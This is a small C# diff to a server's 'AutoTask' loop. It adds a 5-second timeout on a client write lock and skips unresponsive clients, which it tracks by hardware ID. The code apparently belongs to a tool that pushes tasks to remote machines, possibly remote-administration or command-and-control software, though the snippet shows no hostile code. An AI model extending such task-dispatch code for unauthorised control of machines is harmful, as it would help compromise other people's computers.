@@ -3187,7 +3187,10 @@ Read-Host 'Press Enter to close'
                 }
 
                 if (client.Stream == null) continue;
-                await client.WriteLock.WaitAsync();
+                // 5-second timeout on WriteLock — prevents AutoTask from silently hanging
+                // if the client disconnects while another operation holds the lock
+                bool locked = await client.WriteLock.WaitAsync(5000);
+                if (!locked) continue; // client probably gone — skip without marking as executed
                 try { await Protocol.Packet.WriteToStreamAsync(client.Stream, packet); }
                 finally { client.WriteLock.Release(); }
                 task.ExecutedHwids.Add(client.Hwid);
